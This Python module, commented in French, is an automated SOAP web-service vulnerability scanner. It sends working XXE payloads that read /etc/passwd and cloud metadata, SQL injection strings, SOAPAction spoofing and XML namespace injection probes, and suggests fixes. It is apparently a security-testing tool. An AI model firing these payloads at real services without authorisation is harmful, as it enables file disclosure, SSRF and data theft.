# core/scanners/soap_scanner.py
"""
SOAPScanner — Détection automatisée de vulnérabilités SOAP.

Vulnérabilités détectées :
  - XXE            : XML External Entity injection
  - WSDLExposed    : WSDL accessible sans authentification
  - SQLi           : injection SQL dans les balises XML du body SOAP
  - BrokenAuth     : opérations accessibles sans WS-Security header
  - VerboseError   : stack traces exposées dans les réponses d'erreur
  - SOAPAction     : SOAPAction spoofing pour appeler des opérations non prévues
  - XMLInjection   : injection dans les namespaces et attributs XML
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Optional
from urllib.parse import urlparse

from core.requester import Requester
from logger.logger import logger


# ─────────────────────────────────────────────────────────────────────────────
#  Constantes
# ─────────────────────────────────────────────────────────────────────────────

# Endpoints WSDL courants
WSDL_PATHS: list[str] = [
    "?wsdl", "?WSDL",
    "/wsdl", "/service?wsdl",
    "/api?wsdl", "/soap?wsdl",
    "/ws?wsdl", "/services?wsdl",
]

# En-têtes SOAP selon la version
SOAP_HEADERS_11 = {
    "Content-Type": "text/xml; charset=utf-8",
    "SOAPAction":   '""',
}
SOAP_HEADERS_12 = {
    "Content-Type": 'application/soap+xml; charset=utf-8; action=""',
}

# Patterns d'erreur SQL dans les réponses SOAP
SQLI_ERROR_PATTERNS: list[str] = [
    "sql syntax", "mysql_fetch", "ora-01756", "sqlite3",
    "pg_query", "unclosed quotation", "you have an error in your sql",
    "warning: mysql", "invalid query", "sqlstate", "syntax error",
    "microsoft ole db", "native client", "odbc",
]

# Patterns de stack trace dans les réponses SOAP
VERBOSE_ERROR_PATTERNS: list[str] = [
    "at com.", "at org.", "at java.", "at sun.",         # Java
    "stack trace", "stacktrace", "exception in",
    "traceback (most recent", "file \"/",                 # Python
    "system.web", "asp.net", "microsoft.net",             # .NET
    "at System.", "at Microsoft.",
    "line \\d+", "column \\d+",
    "in /var/www", "in /home/",                           # PHP path disclosure
    "php fatal error", "php warning",
]

# Payloads SQLi adaptés au XML (caractères encodés)
SQLI_PAYLOADS_XML: list[str] = [
    "' OR '1'='1",
    "' OR 1=1--",
    "1' ORDER BY 1--",
    "' UNION SELECT NULL--",
    "&apos; OR &apos;1&apos;=&apos;1",   # version encodée XML
    "&#39; OR &#39;1&#39;=&#39;1",       # version entités numériques
]


# ─────────────────────────────────────────────────────────────────────────────
#  Templates XML SOAP
# ─────────────────────────────────────────────────────────────────────────────

def soap_envelope(body_content: str, version: str = "1.1") -> str:
    """Génère une enveloppe SOAP 1.1 ou 1.2."""
    if version == "1.2":
        ns = "http://www.w3.org/2003/05/soap-envelope"
    else:
        ns = "http://schemas.xmlsoap.org/soap/envelope/"

    return f"""<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope
    xmlns:soapenv="{ns}"
    xmlns:web="http://example.com/webservice">
  <soapenv:Header/>
  <soapenv:Body>
    {body_content}
  </soapenv:Body>
</soapenv:Envelope>"""


XXE_PAYLOAD = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY xxe2 SYSTEM "file:///windows/win.ini">
  <!ENTITY xxe3 SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
  <soapenv:Body>
    <web:getData>
      <value>&xxe;</value>
    </web:getData>
  </soapenv:Body>
</soapenv:Envelope>"""

XXE_BLIND_PAYLOAD = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
  %xxe;
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
  <soapenv:Body>
    <web:getData><value>test</value></web:getData>
  </soapenv:Body>
</soapenv:Envelope>"""

MALFORMED_XML = """<?xml version="1.0"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <unclosed_tag>
      <value>test
  </soapenv:Body>
</soapenv:Envelope>"""


# ─────────────────────────────────────────────────────────────────────────────
#  ScanResult
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class ScanResult:
    """Résultat d'une vulnérabilité SOAP détectée."""

    vuln_type:   str
    severity:    str
    endpoint:    str
    method:      str
    payload:     Optional[str]
    evidence:    str
    description: str

    def to_dict(self) -> dict:
        return {
            "vuln_type":   self.vuln_type,
            "severity":    self.severity,
            "endpoint":    self.endpoint,
            "method":      self.method,
            "payload":     self.payload,
            "evidence":    self.evidence,
            "description": self.description,
        }

    def __str__(self) -> str:
        return (
            f"[{self.severity}] {self.vuln_type} — {self.endpoint}\n"
            f"  Payload  : {self.payload}\n"
            f"  Evidence : {self.evidence[:120]}"
        )


# ─────────────────────────────────────────────────────────────────────────────
#  SOAPScanner
# ─────────────────────────────────────────────────────────────────────────────

class SOAPScanner:
    """
    Teste les endpoints SOAP pour des vulnérabilités communes.

    Utilisation :
        scanner = SOAPScanner("https://api.example.com")
        results = scanner.scan(endpoints)
    """

    def __init__(
        self,
        base_url: str,
        timeout: int = 5,
        token: Optional[str] = None,
    ) -> None:
        self.base_url  = base_url.rstrip("/")
        self.http      = Requester(self.base_url, timeout=timeout)
        self._wsdl_ops: list[str] = []   # opérations découvertes dans le WSDL

        if token:
            self.http.set_token(token)

    # =========================================================================
    #  Point d'entrée
    # =========================================================================

    def scan(self, endpoints: list[str], tests: Optional[list[str]] = None) -> list[ScanResult]:
        """
        Lance tous les tests SOAP sur les endpoints fournis.

        Args:
            endpoints : liste d'URLs complètes (depuis discovery)
            tests     : sous-ensemble de tests à lancer (None = tous)

        Returns:
            Liste de ScanResult.
        """
        ALL_TESTS = {
            "wsdl":      self._test_wsdl_exposed,
            "xxe":       self._test_xxe,
            "sqli":      self._test_sqli,
            "auth":      self._test_broken_auth,
            "verbose":   self._test_verbose_errors,
            "action":    self._test_soapaction_spoofing,
            "xmlinject": self._test_xml_injection,
        }

        active = {k: v for k, v in ALL_TESTS.items()
                  if tests is None or k in tests}

        results: list[ScanResult] = []

        # Filtre les endpoints SOAP
        soap_endpoints = self._filter_soap_endpoints(endpoints)

        if not soap_endpoints:
            logger.warning("[SOAP] Aucun endpoint SOAP détecté — test sur les paths courants.")
            soap_endpoints = [self.base_url]

        logger.info(f"[*] SOAP scan — {len(soap_endpoints)} endpoint(s) — tests : {list(active.keys())}")

        for endpoint in soap_endpoints:
            logger.debug(f"    [soap] {endpoint}")

            for test_name, test_fn in active.items():
                try:
                    results += test_fn(endpoint)
                except Exception as e:
                    logger.debug(f"    [soap:{test_name}] erreur : {e}")

        logger.info(f"[+] SOAP scan terminé — {len(results)} vulnérabilité(s) détectée(s)")
        return results

    # =========================================================================
    #  Test 1 — WSDL exposé
    # =========================================================================

    def _test_wsdl_exposed(self, endpoint: str) -> list[ScanResult]:
        """
        Vérifie si le WSDL est accessible sans authentification.
        Le WSDL expose toute l'architecture du service SOAP.
        """
        results: list[ScanResult] = []
        base    = endpoint.rstrip("/")

        for wsdl_path in WSDL_PATHS:
            url  = f"{base}{wsdl_path}"
            path = self._to_path(url)

            r = self.http.get(path)
            if r is None or r.status_code != 200:
                continue

            body = r.text or ""
            # Vérifie que c'est bien un WSDL
            is_wsdl = (
                "definitions" in body.lower()
                or "wsdl" in body.lower()
                or "porttype" in body.lower()
                or "binding" in body.lower()
            )
            if not is_wsdl:
                continue

            # Extrait les opérations disponibles
            ops = re.findall(r'<(?:wsdl:)?operation\s+name=["\']([^"\']+)["\']', body)
            self._wsdl_ops = ops  # cache pour SOAPAction spoofing

            evidence = f"WSDL accessible à {url}"
            if ops:
                evidence += f" — {len(ops)} opération(s) : {', '.join(ops[:5])}"

            results.append(ScanResult(
                vuln_type   = "WSDLExposed",
                severity    = "HIGH",
                endpoint    = url,
                method      = "GET",
                payload     = wsdl_path,
                evidence    = evidence,
                description = (
                    "Le WSDL est accessible sans authentification. "
                    "Il expose toutes les opérations, types de données et URLs du service. "
                    "Protéger l'accès au WSDL en production."
                ),
            ))
            logger.info(f"    [VULN] WSDL Exposé → {url} | {len(ops)} opération(s)")
            break   # Un seul résultat suffit

        return results

    # =========================================================================
    #  Test 2 — XXE (XML External Entity)
    # =========================================================================

    def _test_xxe(self, endpoint: str) -> list[ScanResult]:
        """
        Injecte une entité XML externe dans le body SOAP.
        Si la réponse contient le contenu du fichier → XXE confirmé.
        Si le serveur contacte notre URL → XXE blind.
        """
        results: list[ScanResult] = []
        path    = self._to_path(endpoint)

        # Test XXE classique (file disclosure)
        r = self._soap_post(path, XXE_PAYLOAD)
        if r is None:
            return results

        body = r.text or ""

        # Signatures de lecture de fichiers système
        xxe_evidence_patterns = [
            "root:x:0:0",          # /etc/passwd Linux
            "daemon:x:",
            "[boot loader]",       # win.ini Windows
            "[fonts]",
            "ami-",                # AWS metadata
            "instance-id",
            "public-hostname",
        ]

        for pattern in xxe_evidence_patterns:
            if pattern.lower() in body.lower():
                results.append(ScanResult(
                    vuln_type   = "XXE",
                    severity    = "CRITICAL",
                    endpoint    = endpoint,
                    method      = "POST",
                    payload     = "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
                    evidence    = self._extract_pattern(body, pattern),
                    description = (
                        "XXE confirmé : le parser XML charge des entités externes. "
                        "Un attaquant peut lire des fichiers système, effectuer du SSRF, "
                        "ou provoquer un DoS (Billion Laughs). "
                        "Désactiver le traitement des entités externes dans le parser XML."
                    ),
                ))
                logger.info(f"    [VULN] XXE → {endpoint} | pattern: {pattern!r}")
                return results

        # Test XXE via erreur (serveur tente de charger l'URL)
        if r.status_code in (500, 200) and "xxe" not in body.lower():
            # Tente détection indirecte : le serveur a essayé de résoudre l'entité
            error_body = body.lower()
            network_errors = [
                "connection refused", "network unreachable",
                "name or service not known", "no route to host",
                "timed out", "connection timeout",
            ]
            if any(e in error_body for e in network_errors):
                results.append(ScanResult(
                    vuln_type   = "XXE",
                    severity    = "CRITICAL",
                    endpoint    = endpoint,
                    method      = "POST",
                    payload     = "XXE SSRF via entité externe",
                    evidence    = f"Erreur réseau dans la réponse — le serveur a tenté de résoudre l'entité",
                    description = (
                        "XXE potentiel (SSRF blind) : le serveur tente de résoudre les entités externes. "
                        "Même sans affichage du contenu, cela permet des attaques SSRF. "
                        "Désactiver le traitement des entités externes."
                    ),
                ))
                logger.info(f"    [VULN] XXE blind (SSRF) → {endpoint}")

        return results

    # =========================================================================
    #  Test 3 — SQL Injection via SOAP body
    # =========================================================================

    def _test_sqli(self, endpoint: str) -> list[ScanResult]:
        """
        Injecte des payloads SQL dans les balises XML du body SOAP.
        Détecte les erreurs SQL dans la réponse.
        """
        results: list[ScanResult] = []
        path    = self._to_path(endpoint)

        for payload in SQLI_PAYLOADS_XML:
            body_content = f"""
            <web:getData>
              <id>{payload}</id>
              <username>{payload}</username>
              <search>{payload}</search>
            </web:getData>"""

            envelope = soap_envelope(body_content)
            r        = self._soap_post(path, envelope)

            if r and self._contains_sqli_error(r):
                results.append(ScanResult(
                    vuln_type   = "SQLi",
                    severity    = "CRITICAL",
                    endpoint    = endpoint,
                    method      = "POST",
                    payload     = payload,
                    evidence    = self._extract_sqli_error(r),
                    description = (
                        f"Erreur SQL détectée dans la réponse SOAP avec le payload '{payload}'. "
                        "L'input XML est injecté directement dans la requête SQL. "
                        "Utiliser des requêtes préparées (prepared statements)."
                    ),
                ))
                logger.info(f"    [VULN] SQLi (SOAP) → {endpoint} | payload: {payload!r}")
                break

        return results

    # =========================================================================
    #  Test 4 — Authentification manquante (WS-Security)
    # =========================================================================

    def _test_broken_auth(self, endpoint: str) -> list[ScanResult]:
        """
        Appelle des opérations SOAP sans header WS-Security.
        Si la réponse est 200 avec des données → pas d'authentification.
        """
        results: list[ScanResult] = []
        path    = self._to_path(endpoint)

        # Supprime le token
        saved_auth = self.http._session.headers.get("Authorization")
        self.http.clear_token()

        # Envelope minimale sans WS-Security
        body_content = "<web:getUser><id>1</id></web:getUser>"
        envelope     = soap_envelope(body_content)

        r = self._soap_post(path, envelope)

        if saved_auth:
            self.http._session.headers["Authorization"] = saved_auth

        if r is None:
            return results

        body = (r.text or "").lower()
        auth_errors = [
            "unauthorized", "authentication required", "access denied",
            "ws-security", "wssecurity", "forbidden", "not authorized",
            "mustunderstand",
        ]
        is_auth_required = (
            r.status_code in (401, 403)
            or any(e in body for e in auth_errors)
        )

        if not is_auth_required and r.status_code == 200:
            preview = (r.text or "")[:100].replace("\n", " ").strip()
            results.append(ScanResult(
                vuln_type   = "BrokenAuth",
                severity    = "HIGH",
                endpoint    = endpoint,
                method      = "POST",
                payload     = "Requête SOAP sans WS-Security header",
                evidence    = f"HTTP 200 sans authentification — {preview}",
                description = (
                    "L'opération SOAP est accessible sans header WS-Security. "
                    "Les données sont exposées sans authentification. "
                    "Implémenter WS-Security UsernameToken ou certificat X.509."
                ),
            ))
            logger.info(f"    [VULN] Auth manquante (SOAP) → {endpoint}")

        return results

    # =========================================================================
    #  Test 5 — Verbose Errors (stack traces)
    # =========================================================================

    def _test_verbose_errors(self, endpoint: str) -> list[ScanResult]:
        """
        Envoie un XML malformé pour provoquer une erreur.
        Détecte si la réponse contient une stack trace ou des informations techniques.
        """
        results: list[ScanResult] = []
        path    = self._to_path(endpoint)

        r = self._soap_post(path, MALFORMED_XML)
        if r is None:
            return results

        body = (r.text or "").lower()

        for pattern in VERBOSE_ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                # Extrait le contexte autour du pattern
                idx = body.find(pattern.split("\\")[0].lower())
                if idx == -1:
                    # regex pattern
                    m = re.search(pattern, body, re.IGNORECASE)
                    idx = m.start() if m else 0
                start   = max(0, idx - 30)
                extract = (r.text or "")[start:start + 150].strip()

                results.append(ScanResult(
                    vuln_type   = "VerboseError",
                    severity    = "MEDIUM",
                    endpoint    = endpoint,
                    method      = "POST",
                    payload     = "XML malformé",
                    evidence    = extract[:120],
                    description = (
                        "Le service SOAP retourne des informations techniques dans les messages d'erreur "
                        "(stack trace, chemin de fichiers, version du framework). "
                        "Ces informations aident un attaquant à cibler ses attaques. "
                        "Configurer des messages d'erreur génériques en production."
                    ),
                ))
                logger.info(f"    [VULN] Verbose Errors → {endpoint} | pattern: {pattern!r}")
                break

        return results

    # =========================================================================
    #  Test 6 — SOAPAction Spoofing
    # =========================================================================

    def _test_soapaction_spoofing(self, endpoint: str) -> list[ScanResult]:
        """
        Modifie le header SOAPAction pour appeler une opération différente.
        Si le serveur exécute l'opération du header au lieu du body → vulnérable.
        """
        results: list[ScanResult] = []
        path    = self._to_path(endpoint)

        # Utilise les opérations du WSDL si disponibles
        test_actions = self._wsdl_ops[:5] if self._wsdl_ops else [
            "getAdminData", "deleteUser", "resetPassword",
            "getSecretKey", "listAllUsers",
        ]

        # Réponse de référence avec SOAPAction vide
        r_ref = self._soap_post(path, soap_envelope("<web:getUser><id>1</id></web:getUser>"))
        if r_ref is None:
            return results

        ref_status = r_ref.status_code
        ref_body   = (r_ref.text or "").strip()

        for action in test_actions:
            r = self._soap_post(
                path,
                soap_envelope("<web:getUser><id>1</id></web:getUser>"),
                soapaction=action,
            )
            if r is None:
                continue

            # Si la réponse diffère de la référence → le serveur traite le SOAPAction
            if (
                r.status_code != ref_status
                or (r.text or "").strip() != ref_body
            ) and r.status_code != 404:
                results.append(ScanResult(
                    vuln_type   = "SOAPActionSpoofing",
                    severity    = "HIGH",
                    endpoint    = endpoint,
                    method      = "POST",
                    payload     = f"SOAPAction: {action}",
                    evidence    = (
                        f"SOAPAction '{action}' → HTTP {r.status_code} "
                        f"(différent de la réponse de référence)"
                    ),
                    description = (
                        f"Le header SOAPAction '{action}' modifie le comportement du serveur. "
                        "Un attaquant peut router la requête vers une opération non prévue "
                        "en manipulant ce header. "
                        "Valider que le SOAPAction correspond à l'opération dans le body XML."
                    ),
                ))
                logger.info(f"    [VULN] SOAPAction Spoofing → {endpoint} | action: {action!r}")
                break

        return results

    # =========================================================================
    #  Test 7 — XML Injection (namespaces)
    # =========================================================================

    def _test_xml_injection(self, endpoint: str) -> list[ScanResult]:
        """
        Injecte des namespaces XML malveillants et des attributs inattendus.
        Tente de contourner les validations basées sur les namespaces.
        """
        results: list[ScanResult] = []
        path    = self._to_path(endpoint)

        injected_payloads = [
            # Namespace injection
            (
                "Namespace injection",
                """<?xml version="1.0"?>
<soapenv:Envelope
    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
    xmlns:evil="http://attacker.com/evil"
    xmlns:web="http://example.com/webservice">
  <soapenv:Header>
    <evil:inject>admin</evil:inject>
  </soapenv:Header>
  <soapenv:Body>
    <web:getUser><id>1</id></web:getUser>
  </soapenv:Body>
</soapenv:Envelope>"""
            ),
            # Tag injection dans les valeurs
            (
                "Tag injection dans les valeurs",
                soap_envelope("""
                <web:getUser>
                  <id><![CDATA[1</id><admin>true</admin><id>1]]></id>
                </web:getUser>"""),
            ),
            # Attribut injection
            (
                "Attribut injection",
                soap_envelope("""
                <web:getUser role="admin" isAdmin="true">
                  <id>1</id>
                </web:getUser>"""),
            ),
        ]

        for payload_name, envelope in injected_payloads:
            r = self._soap_post(path, envelope)
            if r is None:
                continue

            body = (r.text or "").lower()

            # Signes de traitement de l'injection
            success_signals = [
                "admin", "administrator", "root",
                "privilege", "elevated", "granted",
            ]
            error_signals = [
                "invalid xml", "xml parse error",
                "malformed", "not well-formed",
            ]

            has_success = any(s in body for s in success_signals)
            has_error   = any(s in body for s in error_signals)

            if has_success and not has_error and r.status_code == 200:
                results.append(ScanResult(
                    vuln_type   = "XMLInjection",
                    severity    = "MEDIUM",
                    endpoint    = endpoint,
                    method      = "POST",
                    payload     = payload_name,
                    evidence    = f"HTTP 200 — réponse suspecte avec {payload_name}",
                    description = (
                        f"L'endpoint accepte {payload_name} sans erreur. "
                        "Le parser XML pourrait traiter des éléments injectés. "
                        "Valider et sanitizer strictement les données XML reçues."
                    ),
                ))
                logger.info(f"    [VULN] XML Injection → {endpoint} | {payload_name}")
                break

        return results

    # =========================================================================
    #  Helpers privés
    # =========================================================================

    def _to_path(self, endpoint: str) -> str:
        return endpoint.replace(self.base_url, "") or "/"

    def _soap_post(self, path: str, body: str, soapaction: str = "") -> object:
        """Envoie une requête SOAP POST avec les bons headers."""
        headers = {
            "Content-Type": "text/xml; charset=utf-8",
            "SOAPAction":   f'"{soapaction}"',
        }
        return self.http.post(path, data=body, headers=headers)

    def _contains_sqli_error(self, r) -> bool:
        if r is None:
            return False
        try:
            body = r.text.lower()
            return any(p in body for p in SQLI_ERROR_PATTERNS)
        except Exception:
            return False

    def _extract_sqli_error(self, r, length: int = 200) -> str:
        try:
            body = r.text.lower()
            for pattern in SQLI_ERROR_PATTERNS:
                idx = body.find(pattern)
                if idx != -1:
                    start = max(0, idx - 20)
                    return r.text[start:start + length].strip()
        except Exception:
            pass
        return (r.text or "")[:length].strip()

    def _extract_pattern(self, body: str, pattern: str, length: int = 150) -> str:
        idx = body.lower().find(pattern.lower())
        if idx == -1:
            return body[:length]
        start = max(0, idx - 20)
        return body[start:start + length].strip()

    def _filter_soap_endpoints(self, endpoints: list[str]) -> list[str]:
        """Filtre les endpoints qui ressemblent à du SOAP."""
        keywords = ["soap", "wsdl", "service", "ws", "webservice", ".asmx", ".svc"]
        return [
            ep for ep in endpoints
            if any(kw in ep.lower() for kw in keywords)
        ]